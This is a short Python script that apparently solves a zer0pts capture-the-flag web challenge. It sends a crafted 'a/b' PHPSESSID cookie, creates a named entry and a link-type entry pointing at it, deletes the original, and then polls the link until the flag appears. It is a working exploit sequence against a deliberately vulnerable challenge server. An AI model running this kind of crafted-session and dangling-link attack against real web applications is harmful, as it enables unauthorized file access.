import requests

URL = "http://web.ctf.zer0pts.com:8001/"
# URL = "http://localhost:8080/"

cookies = {
    "PHPSESSID": "a/b"
}

cnt = 0

sess = requests.Session()


sess.post(
    URL,
    cookies=cookies,
    data={
        "mode": "create",
        "name": "qwaz",
    }
)

sess.post(
    URL,
    cookies=cookies,
    data={
        "mode": "create",
        "name": "r00timentary",
        "type": "1",
        "target": "qwaz",
    }
)

sess.post(
    URL,
    cookies=cookies,
    data={
        "mode": "delete",
        "name": "qwaz",
    }
)

while True:
    r = sess.post(
        URL,
        cookies=cookies,
        data={
            "mode": "read",
            "name": "r00timentary",
        }
    )

    response = r.text
    if "zer0pts" in response:
        print(response)
        break

    print(f"Try {cnt} - {r.status_code}")
    cnt += 1
